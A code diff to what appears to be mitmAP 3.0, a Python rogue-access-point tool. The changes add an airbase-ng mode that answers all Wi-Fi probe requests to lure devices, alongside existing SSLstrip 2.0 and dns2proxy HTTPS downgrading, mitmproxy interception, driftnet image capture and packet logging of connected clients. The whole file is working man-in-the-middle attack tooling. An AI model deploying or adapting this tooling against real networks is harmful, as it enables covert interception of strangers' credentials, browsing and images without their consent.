@@ -7,7 +7,7 @@ print("           _ _              ___  ______ \n" +
       "| '_ ` _ \| | __| '_ ` _ \|  _  ||  __/ \n" +
       "| | | | | | | |_| | | | | | | | || |    \n" +
       "|_| |_| |_|_|\__|_| |_| |_\_| |_/\_| 3.0\n" +
-      "[airbase-ng] by David Schütz (@xdavidhu)\n")
+      "       [dev] by David Schütz (@xdavidhu)\n")
 
 script_path = os.path.dirname(os.path.realpath(__file__))
 script_path = script_path + "/"
@@ -27,6 +27,7 @@ if update == "y" or update == "":
     os.system("sudo apt-get install screen -y > /dev/null 2>&1")
     os.system("sudo apt-get install wondershaper -y > /dev/null 2>&1")
     os.system("sudo apt-get install driftnet -y > /dev/null 2>&1")
+    os.system("sudo apt-get install aircrack-ng > /dev/null 2>&1")
     os.system("sudo pip install dnspython > /dev/null 2>&1")
     os.system("sudo pip install pcapy > /dev/null 2>&1")
 #/UPDATING
@@ -34,6 +35,42 @@ if update == "y" or update == "":
 ap_iface = input("[?] Please enter the name of your wireless interface (for the AP): ")
 net_iface = input("[?] Please enter the name of your internet connected interface: ")
 network_manager_cfg = "[main]\nplugins=keyfile\n\n[keyfile]\nunmanaged-devices=interface-name:" + ap_iface
+
+ap_iface_default = ap_iface
+
+#AIRBASE QUESTION
+airbase_if = input("[?] Use AIRBASE-NG and respond to all probe requests? (monitor mode support needed) Y/n: ")
+airbase_if = airbase_if.lower()
+if airbase_if == "y" or airbase_if == "":
+    use_airbase = True
+else:
+    use_airbase = False
+#/AIRBASE QUESTION
+
+#SSLSTRIP QUESTION
+sslstrip_if = input("[?] Use SSLSTRIP 2.0? Y/n: ")
+sslstrip_if = sslstrip_if.lower()
+#/SSLSTRIP QUESTION
+
+if sslstrip_if == "n":
+    #PROXY QUESTION
+    proxy_if = input("[?] Capture traffic? Y/n: ")
+    proxy_if = proxy_if.lower()
+    #/PROXY QUESTION
+else:
+    proxy_if = "n"
+
+if use_airbase:
+    print("[I] Setting " + ap_iface + " to monitor mode...")
+    os.system("sudo airmon-ng start " + ap_iface + " > /dev/null 2>&1")
+    print("[I] Starting AIRBASE-NG on " + ap_iface + "mon...")
+    if sslstrip_if == "n" and proxy_if == "n":
+        basic_mode = True
+    else:
+        basic_mode = False
+        os.system("sudo screen -S mitmap-airbase -m -d airbase-ng -P " + ap_iface + "mon")
+    ap_iface = "at0"
+
 print("[I] Backing up NetworkManager.cfg...")
 os.system("sudo cp /etc/NetworkManager/NetworkManager.conf /etc/NetworkManager/NetworkManager.conf.backup")
 print("[I] Editing NetworkManager.cfg...")
@@ -41,13 +78,6 @@ os.system("sudo echo -e '" + network_manager_cfg + "' > /etc/NetworkManager/Netw
 print("[I] Restarting NetworkManager...")
 os.system("sudo service network-manager restart")
 os.system("sudo ifconfig " + ap_iface + " up")
-
-os.system("sudo screen -S mitmap-airbase -m -d airbase-ng -P wlan1mon")
-
-#SSLSTRIP QUESTION
-sslstrip_if = input("[?] Use SSLSTRIP 2.0? Y/n: ")
-sslstrip_if = sslstrip_if.lower()
-#/SSLSTRIP QUESTION
 
 #DRIFTNET QUESTION
 driftnet_if = input("[?] Capture unencrypted images with DRIFTNET? Y/n: ")
@@ -68,41 +98,42 @@ print("[I] Writing config file...")
 os.system("sudo echo -e '" + dnsmasq_file + "' > /etc/dnsmasq.conf")
 #/DNSMASQ CONFIG
 
-# #HOSTAPD CONFIG
-# hostapd_config = input("[?] Create new HOSTAPD config file at '/etc/hostapd/hostapd.conf' Y/n: ")
-# hostapd_config = hostapd_config.lower()
-# if hostapd_config == "y" or hostapd_config == "":
-#     ssid = input("[?] Please enter the SSID for the AP: ")
-#     while True:
-#         channel = input("[?] Please enter the channel for the AP: ")
-#         if channel.isdigit():
-#             break
-#         else:
-#             print("[!] Please enter a channel number.")
-#     hostapd_wpa = input("[?] Enable WPA2 encryption? y/N: ")
-#     hostapd_wpa = hostapd_wpa.lower()
-#     if hostapd_wpa == "y":
-#         canBreak = False
-#         while not canBreak:
-#             wpa_passphrase = input("[?] Please enter the WPA2 passphrase for the AP: ")
-#             if len(wpa_passphrase) < 8:
-#                 print("[!] Please enter minimum 8 characters for the WPA2 passphrase.")
-#             else:
-#                 canBreak = True
-#         hostapd_file_wpa = "interface=" + ap_iface + "\ndriver=nl80211\nssid=" + ssid + "\nhw_mode=g\nchannel=" + channel + "\nmacaddr_acl=0\nauth_algs=1\nignore_broadcast_ssid=0\nwpa=2\nwpa_passphrase=" + wpa_passphrase + "\nwpa_key_mgmt=WPA-PSK\nwpa_pairwise=TKIP\nrsn_pairwise=CCMP"
-#         print("[I] Deleting old config file...")
-#         os.system("sudo rm /etc/hostapd/hostapd.conf > /dev/null 2>&1")
-#         print("[I] Writing config file...")
-#         os.system("sudo echo -e '" + hostapd_file_wpa + "' > /etc/hostapd/hostapd.conf")
-#     else:
-#         hostapd_file = "interface=" + ap_iface + "\ndriver=nl80211\nssid=" + ssid + "\nhw_mode=g\nchannel=" + channel + "\nmacaddr_acl=0\nauth_algs=1\nignore_broadcast_ssid=0"
-#         print("[I] Deleting old config file...")
-#         os.system("sudo rm /etc/hostapd/hostapd.conf > /dev/null 2>&1")
-#         print("[I] Writing config file...")
-#         os.system("sudo echo -e '" + hostapd_file + "' > /etc/hostapd/hostapd.conf")
-# else:
-#     print("[I] Skipping..")
-# #/HOSTAPD CONFIG
+if not use_airbase:
+    #HOSTAPD CONFIG
+    hostapd_config = input("[?] Create new HOSTAPD config file at '/etc/hostapd/hostapd.conf' Y/n: ")
+    hostapd_config = hostapd_config.lower()
+    if hostapd_config == "y" or hostapd_config == "":
+        ssid = input("[?] Please enter the SSID for the AP: ")
+        while True:
+            channel = input("[?] Please enter the channel for the AP: ")
+            if channel.isdigit():
+                break
+            else:
+                print("[!] Please enter a channel number.")
+        hostapd_wpa = input("[?] Enable WPA2 encryption? y/N: ")
+        hostapd_wpa = hostapd_wpa.lower()
+        if hostapd_wpa == "y":
+            canBreak = False
+            while not canBreak:
+                wpa_passphrase = input("[?] Please enter the WPA2 passphrase for the AP: ")
+                if len(wpa_passphrase) < 8:
+                    print("[!] Please enter minimum 8 characters for the WPA2 passphrase.")
+                else:
+                    canBreak = True
+            hostapd_file_wpa = "interface=" + ap_iface + "\ndriver=nl80211\nssid=" + ssid + "\nhw_mode=g\nchannel=" + channel + "\nmacaddr_acl=0\nauth_algs=1\nignore_broadcast_ssid=0\nwpa=2\nwpa_passphrase=" + wpa_passphrase + "\nwpa_key_mgmt=WPA-PSK\nwpa_pairwise=TKIP\nrsn_pairwise=CCMP"
+            print("[I] Deleting old config file...")
+            os.system("sudo rm /etc/hostapd/hostapd.conf > /dev/null 2>&1")
+            print("[I] Writing config file...")
+            os.system("sudo echo -e '" + hostapd_file_wpa + "' > /etc/hostapd/hostapd.conf")
+        else:
+            hostapd_file = "interface=" + ap_iface + "\ndriver=nl80211\nssid=" + ssid + "\nhw_mode=g\nchannel=" + channel + "\nmacaddr_acl=0\nauth_algs=1\nignore_broadcast_ssid=0"
+            print("[I] Deleting old config file...")
+            os.system("sudo rm /etc/hostapd/hostapd.conf > /dev/null 2>&1")
+            print("[I] Writing config file...")
+            os.system("sudo echo -e '" + hostapd_file + "' > /etc/hostapd/hostapd.conf")
+    else:
+        print("[I] Skipping..")
+    #/HOSTAPD CONFIG
 
 #IPTABLES
 print("[I] Configuring AP interface...")
@@ -189,6 +220,8 @@ if sslstrip_if == "y" or sslstrip_if == "":
     os.system("sudo screen -S mitmap-sslstrip -m -d python " + script_path + "src/sslstrip2/sslstrip.py -l 9000 -w " + script_path + "logs/mitmap-sslstrip.log -a")
     os.system("sudo screen -S mitmap-dns2proxy -m -d sh -c 'cd " + script_path + "src/dns2proxy && python dns2proxy.py'")
     time.sleep(5)
+    if not use_airbase:
+        os.system("sudo screen -S mitmap-hostapd -m -d hostapd /etc/hostapd/hostapd.conf")
 
     if wireshark_if == "y" or wireshark_if == "":
         print("[I] Starting WIRESHARK...")
@@ -246,9 +279,7 @@ else:
     os.system("sudo pkill dnsmasq")
     os.system("sudo dnsmasq")
 
-    #MITMAP MODE
-    proxy_if = input("[?] Capture traffic? Y/n: ")
-    proxy_if = proxy_if.lower()
+    #MITMPROXY MODE
     if proxy_if == "y" or proxy_if == "":
         proxy_config = input("[?] Capture HTTPS traffic too? (Need to install certificate on device) y/N: ")
         proxy_config = proxy_config.lower()
@@ -269,7 +300,8 @@ else:
         if tshark_if == "y" or tshark_if == "":
             print("[I] Starting TSHARK...")
             os.system("sudo screen -S mitmap-tshark -m -d tshark -i " + ap_iface + " -w " + script_path + "logs/mitmap-tshark.pcap")
-        os.system("sudo screen -S mitmap-hostapd -m -d hostapd /etc/hostapd/hostapd.conf")
+        if not use_airbase:
+            os.system("sudo screen -S mitmap-hostapd -m -d hostapd /etc/hostapd/hostapd.conf")
         print("\nStarting MITMPROXY in 5 seconds... (press q and y to exit)\n")
         try:
             time.sleep(5)
@@ -279,7 +311,7 @@ else:
         #STARTING POINT
     else:
         print("[I] Skipping...")
-    #/MITMAP MODE
+    #/MITMPROXY MODE
 
         if wireshark_if == "y" or wireshark_if == "":
             print("[I] Starting WIRESHARK...")
@@ -292,14 +324,20 @@ else:
             os.system("sudo screen -S mitmap-tshark -m -d tshark -i " + ap_iface + " -w " + script_path + "logs/mitmap-tshark.pcap")
         os.system("sudo sysctl -w net.ipv4.ip_forward=1 > /dev/null 2>&1")
         print("[I] Starting AP on " + ap_iface + "...\n")
-        os.system("sudo hostapd /etc/hostapd/hostapd.conf")
+        if not use_airbase:
+            os.system("sudo hostapd /etc/hostapd/hostapd.conf")
+        else:
+            os.system("airbase-ng -P " + ap_iface_default + "mon")
         #STARTING POINT
 
 #STOPPING
 print("")
 print("[!] Stopping...")
 if proxy_if == "y" or proxy_if == "" or sslstrip_if == "y" or sslstrip_if == "":
-    os.system("sudo screen -S mitmap-hostapd -X stuff '^C\n'")
+    if not use_airbase:
+        os.system("sudo screen -S mitmap-hostapd -X stuff '^C\n'")
+    else:
+        os.system("sudo screen -S mitmap-airbase -X stuff '^C\n'")
     if sslstrip_if == "y" or sslstrip_if == "":
         os.system("sudo screen -S mitmap-sslstrip -X stuff '^C\n'")
         os.system("sudo screen -S mitmap-dns2proxy -X stuff '^C\n'")
@@ -314,9 +352,9 @@ if tshark_if == "y" or tshark_if == "":
     os.system("sudo screen -S mitmap-tshark -X stuff '^C\n'")
 print("[I] Restoring old NetworkManager.cfg")
 if os.path.isfile("/etc/NetworkManager/NetworkManager.conf.backup"):
-	os.system("sudo mv /etc/NetworkManager/NetworkManager.conf.backup /etc/NetworkManager/NetworkManager.conf")
+    os.system("sudo mv /etc/NetworkManager/NetworkManager.conf.backup /etc/NetworkManager/NetworkManager.conf")
 else:
-	os.system("sudo rm /etc/NetworkManager/NetworkManager.conf")
+    os.system("sudo rm /etc/NetworkManager/NetworkManager.conf")
 print("[I] Restarting NetworkManager...")
 os.system("sudo service network-manager restart")
 print("[I] Stopping DNSMASQ server...")
